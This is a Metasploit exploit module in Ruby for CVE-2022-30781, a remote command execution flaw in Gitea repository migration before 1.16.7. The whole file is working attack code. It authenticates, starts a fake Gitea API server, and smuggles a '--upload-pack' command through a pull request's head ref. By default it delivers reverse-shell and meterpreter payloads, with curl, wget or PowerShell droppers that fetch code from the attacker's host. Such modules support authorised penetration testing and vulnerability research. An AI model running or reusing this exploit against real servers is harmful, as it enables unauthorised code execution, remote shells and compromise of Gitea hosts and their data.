##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HTTP::Gitea
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gitea Git Fetch Remote Code Execution',
        'Description' => %q{
          This module exploits Git fetch command in Gitea repository migration
          process that leads to a remote command execution on the system.
          This vulnerability affect Gitea before 1.16.7 version.
        },
        'Author' => [
          'wuhan005', # Original PoC
          'li4n0', # Original PoC
          'krastanoel' # MSF Module
        ],
        'References' => [
          ['CVE', '2022-30781'],
          ['URL', 'https://tttang.com/archive/1607/']
        ],
        'DisclosureDate' => '2022-05-16',
        'License' => MSF_LICENSE,
        'Platform' => %w[unix linux win],
        'Arch' => ARCH_CMD,
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => %i[curl wget echo printf],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :win_dropper,
              'CmdStagerFlavor' => [ 'psh_invokewebrequest' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                'CMDSTAGER::URIPATH' => '/payloads'
              }
            }
          ]
        ],
        'DefaultOptions' => { 'WfsDelay' => 30 },
        'DefaultTarget' => 1,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )

    register_options([
      Opt::RPORT(3000),
      OptString.new('USERNAME', [true, 'Username to authenticate with']),
      OptString.new('PASSWORD', [true, 'Password to use']),
      OptString.new('URIPATH', [false, 'The URI to use for this exploit', '/']),
    ])
  end

  def cleanup
    super
    return if @uid.nil? || @migrate_repo_created.nil?

    [@repo_name, @migrate_repo_name].each do |name|
      res = gitea_remove_repo(repo_path(name))
      if res.nil? || res&.code == 200
        vprint_warning("Unable to remove repository '#{name}'")
      elsif res&.code == 404
        vprint_warning("Repository '#{name}' not found, possibly already deleted")
      else
        vprint_status("Successfully cleanup repository '#{name}'")
      end
    end
  end

  def check
    return CheckCode::Safe('USERNAME can\'t be blank') if datastore['username'].blank?

    v = get_gitea_version
    gitea_login(datastore['username'], datastore['password'])

    if Rex::Version.new(v) <= Rex::Version.new('1.16.6')
      return CheckCode::Appears("Version detected: #{v}")
    end

    CheckCode::Safe("Version detected: #{v}")
  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::UnknownError => e
    return CheckCode::Unknown(e.message)
  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::VersionError => e
    return CheckCode::Detected(e.message)
  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError,
         Msf::Exploit::Remote::HTTP::Gitea::Error::AuthenticationError => e
    return CheckCode::Safe(e.message)
  end

  def primer
    [
      '/api/v1/version', '/api/v1/settings/api',
      "/api/v1/repos/#{@migrate_repo_path}",
      "/api/v1/repos/#{@migrate_repo_path}/pulls",
      "/api/v1/repos/#{@migrate_repo_path}/topics"
    ].each { |uri| hardcoded_uripath(uri) } # adding resources
  end

  def execute_command(cmd, _opts = {})
    if target['Type'] == :win_dropper
      # Git on Windows will pass the command to `sh.exe` and not `cmd`.
      # This requires some adjustments:
      # - Windows environment variables are mapped by `sh.exe`: `%VAR%` becomes `$VAR`
      # - `cmd` uses `&` to join multiple commands, whereas `sh.exe` uses `&&`.
      # - Backslashes need to be escaped with `sh.exe`
      cmd = cmd.gsub(/%(\w+)%/) { "$#{::Regexp.last_match(1)}" }.gsub(/&/) { '&&' }.gsub(/\\/) { '\\\\\\' }
    end
    vprint_status("Executing command: #{cmd}")

    @repo_name = rand_text_alphanumeric(6..15)
    @migrate_repo_name = rand_text_alphanumeric(6..15)
    @migrate_repo_path = repo_path(@migrate_repo_name)

    vprint_status("Creating repository \"#{@repo_name}\"")
    @uid = gitea_create_repo(@repo_name)
    vprint_good('Repository created')
    vprint_status('Migrating repository')
    clone_url = "http://#{srvhost_addr}:#{srvport}/#{@migrate_repo_path}"
    auth_token = rand_text_alphanumeric(6..15)
    @migrate_repo_created = gitea_migrate_repo(@migrate_repo_name, @uid, clone_url, auth_token)
    @p = cmd
  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::MigrationError,
         Msf::Exploit::Remote::HTTP::Gitea::Error::RepositoryError,
         Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError => e
    fail_with(Failure::UnexpectedReply, e.message)
  end

  def exploit
    unless datastore['AutoCheck']
      fail_with(Failure::BadConfig, 'USERNAME can\'t be blank') if datastore['username'].blank?
      gitea_login(datastore['username'], datastore['password'])
    end

    start_service
    primer

    case target['Type']
    when :unix_cmd, :win_cmd
      execute_command(payload.encoded)
    when :linux_dropper, :win_dropper
      datastore['CMDSTAGER::URIPATH'] = "/#{rand_text_alphanumeric(6..15)}"
      execute_cmdstager(background: true, delay: 1)
    end
  rescue Timeout::Error => e
    fail_with(Failure::TimeoutExpired, e.message)
  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::CsrfError => e
    fail_with(Failure::UnexpectedReply, e.message)
  rescue Msf::Exploit::Remote::HTTP::Gitea::Error::AuthenticationError => e
    fail_with(Failure::NoAccess, e.message)
  end

  def repo_path(name)
    "#{datastore['username']}/#{name}"
  end

  def on_request_uri(cli, req)
    case req.uri
    when '/api/v1/version'
      send_response(cli, '{"version": "1.16.6"}')
    when '/api/v1/settings/api'
      data = {
        max_response_items: 50, default_paging_num: 30,
        default_git_trees_per_page: 1000, default_max_blob_size: 10485760
      }
      send_response(cli, data.to_json)
    when "/api/v1/repos/#{@migrate_repo_path}"
      data = {
        clone_url: "#{full_uri}#{datastore['username']}/#{@repo_name}",
        owner: { login: datastore['username'] }
      }
      send_response(cli, data.to_json)
    when "/api/v1/repos/#{@migrate_repo_path}/topics?limit=0&page=1"
      send_response(cli, '{"topics":[]}')
    when "/api/v1/repos/#{@migrate_repo_path}/pulls?limit=50&page=1&state=all"
      data = [
        {
          base: {
            ref: 'master'
          },
          head: {
            ref: "--upload-pack=#{@p}",
            repo: {
              clone_url: './',
              owner: { login: 'master' }
            }
          },
          updated_at: '2001-01-01T05:00:00+01:00',
          user: {}
        }
      ]
      send_response(cli, data.to_json)
    when datastore['CMDSTAGER::URIPATH']
      super
    end
  end
end
